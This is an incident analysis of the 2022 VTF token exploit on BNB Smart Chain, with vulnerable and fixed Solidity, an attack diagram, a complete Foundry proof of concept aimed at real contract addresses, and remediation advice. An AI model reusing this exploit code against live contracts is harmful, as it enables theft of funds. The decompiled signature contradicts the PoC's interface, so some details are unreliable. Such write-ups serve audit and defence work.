# VTF — updateUserBalance() + CREATE2 400-Contract Balance Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | VTF Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **VTF Token** | [0xc6548caF18e20F88cC437a52B6D388b0D54d830D](https://bscscan.com/address/0xc6548caF18e20F88cC437a52B6D388b0D54d830D) |
| **Router** | [0x7529740ECa172707D8edBCcdD2Cba3d140ACBd85](https://bscscan.com/address/0x7529740ECa172707D8edBCcdD2Cba3d140ACBd85) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **DODO Flash Loan** | [0x26d0c625e5F5D6de034495fbDe1F6e9377185618](https://bscscan.com/address/0x26d0c625e5F5D6de034495fbDe1F6e9377185618) |
| **Root Cause** | `updateUserBalance()` function allows manipulation of user balances without access control; repeated claims executed via 400 contracts deployed with CREATE2 |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/VTF_exp.sol) |

---
## 1. Vulnerability Overview

The `updateUserBalance()` function of the VTF token contract is a function that allows external updates to user balances, with no access control in place. The attacker flash-borrowed 100,000 USDT from DODO to purchase VTF, then deployed 400 `claimReward` contracts using CREATE2. Each contract called `updateUserBalance()` to artificially inflate its balance, forwarded VTF to the next contract in a chain structure, and repeatedly executed `claim()`. Finally, the accumulated VTF was sold for USDT to repay the flash loan and realize the profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable updateUserBalance() - no access control
contract VTFToken {
    mapping(address => uint256) public userBalance;

    // ❌ Anyone can call to manipulate the balance of any arbitrary address
    function updateUserBalance(address user, uint256 amount) external {
        userBalance[user] += amount;
    }

    function claim() external {
        uint256 balance = userBalance[msg.sender];
        require(balance > 0, "No balance");
        userBalance[msg.sender] = 0;
        _transfer(address(this), msg.sender, balance);
    }
}

// ✅ Correct pattern - internal function or access control applied
contract SafeVTFToken {
    mapping(address => uint256) internal userBalance;

    // ✅ Balance updates only through internal function
    function _updateUserBalance(address user, uint256 amount) internal {
        userBalance[user] += amount;
    }

    // ✅ Balance cannot be manipulated externally
    function claim() external {
        uint256 balance = userBalance[msg.sender];
        require(balance > 0, "No balance");
        userBalance[msg.sender] = 0;
        _transfer(address(this), msg.sender, balance);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**VTF_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: `updateUserBalance()` function allows manipulation of user balances without access control, with repeated claims via 400 contracts deployed using CREATE2
    function updateUserBalance(address arg0) external view returns (uint256) {}  // 0x993ae7e9  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 100,000 USDT from DODO
    │
    ├─[2] Swap USDT → VTF (Router)
    │
    ├─[3] Deploy 400 claimReward contracts via CREATE2
    │       salt = 0, 1, 2, ..., 399
    │       Each contract: unique address
    │
    ├─[4] Transfer VTF to the first contract
    │
    ├─[5] Chain execution (contract[0] → [1] → ... → [399])
    │       Each contract:
    │       ├─ updateUserBalance(self, vtfBalance)  ← ❌ inflate balance
    │       ├─ claim()                               ← claim VTF with inflated balance
    │       └─ Transfer VTF to next contract
    │
    ├─[6] Final contract transfers accumulated VTF to attacker
    │
    ├─[7] Swap VTF → USDT (reverse swap)
    │
    ├─[8] Repay DODO flash loan
    │
    └─[9] Net profit: arbitrage (scale unconfirmed)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IVTF {
    // ❌ Balance update without access control
    function updateUserBalance(address user, uint256 amount) external;
    function claim() external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IRouter {
    function swapExactTokensForTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external returns (uint256[] memory);
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// Chain claim contract deployed via CREATE2
contract ClaimReward {
    IVTF public vtf;
    address public next;  // Next contract address
    address public owner;

    constructor(address _vtf, address _next) {
        vtf = IVTF(_vtf);
        next = _next;
        owner = msg.sender;
    }

    function execute() external {
        uint256 balance = vtf.balanceOf(address(this));
        if (balance > 0) {
            // ⚡ Inflate own balance via updateUserBalance
            vtf.updateUserBalance(address(this), balance);
            vtf.claim();

            // Transfer accumulated VTF to next contract or owner
            uint256 newBalance = vtf.balanceOf(address(this));
            if (next != address(0)) {
                vtf.transfer(next, newBalance);
                ClaimReward(next).execute();
            } else {
                vtf.transfer(owner, newBalance);
            }
        }
    }
}

contract VTFExploit is Test {
    IVTF vtf     = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
    IRouter router = IRouter(0x7529740ECa172707D8edBCcdD2Cba3d140ACBd85);
    IDODO dodo   = IDODO(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IERC20 USDT  = IERC20(0x55d398326f99059fF775485246999027B3197955);

    ClaimReward[] contracts;

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT", USDT.balanceOf(address(this)), 18);

        dodo.flashLoan(100_000 * 1e18, 0, address(this), "");

        emit log_named_decimal_uint("[End] USDT", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] USDT → VTF
        USDT.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(vtf);
        router.swapExactTokensForTokens(amount / 2, 0, path, address(this), block.timestamp);

        // [Step 3] Deploy 400 contracts via CREATE2 (created in reverse order)
        address nextAddr = address(0);
        for (int256 i = 399; i >= 0; i--) {
            bytes32 salt = bytes32(uint256(i));
            ClaimReward c = new ClaimReward{salt: salt}(address(vtf), nextAddr);
            contracts.push(c);
            nextAddr = address(c);
        }

        // [Step 4] Transfer VTF to the first contract
        vtf.transfer(address(contracts[399]), vtf.balanceOf(address(this)));

        // [Step 5] Chain execution
        contracts[399].execute();

        // [Step 6] VTF → USDT reverse swap
        vtf.approve(address(router), type(uint256).max);
        path[0] = address(vtf);
        path[1] = address(USDT);
        router.swapExactTokensForTokens(vtf.balanceOf(address(this)), 0, path, address(this), block.timestamp);

        // Repay DODO
        USDT.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing access control on updateUserBalance() + CREATE2 multi-contract chain claiming |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Reward Manipulation Attack |
| **Attack Vector** | DODO flash loan → VTF purchase → CREATE2 ×400 → `updateUserBalance()` + `claim()` chain |
| **Precondition** | No access control on `updateUserBalance()` function |
| **Impact** | Large-scale VTF token theft (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Access control on updateUserBalance()**: Change to an `internal` function or add an `onlyOwner`/`onlyProtocol` modifier to block direct external calls.
2. **Internalize balance update logic**: User balance updates should only occur through internal protocol logic (swaps, staking, etc.) and must not be controllable via external parameters.
3. **Defense against CREATE2 multi-address attacks**: Airdrop/reward claim functions should either exclude contract addresses, or use `tx.origin == msg.sender` validation to block proxy claims by contracts.

---
## 7. Lessons Learned

- **Public exposure of state-changing functions**: Exposing functions that modify internal state — such as `update*()` or `set*()` — as `external` always introduces manipulation risk. State-changing functions that do not need to be called externally should remain `internal`.
- **CREATE2 chain attacks**: Similar to the RL token attack (100 contracts), the pattern of deploying hundreds of contracts via CREATE2 and accumulating rewards in a chain structure recurs repeatedly. Reward function designs must explicitly defend against this pattern.
- **Flash loan + internal state manipulation**: Compound attacks that use flash loans to inflate prices and then exploit internal state manipulation for additional gain are difficult to detect from a single vulnerability alone. During whitebox audits, the list of externally accessible state-changing functions should be reviewed separately.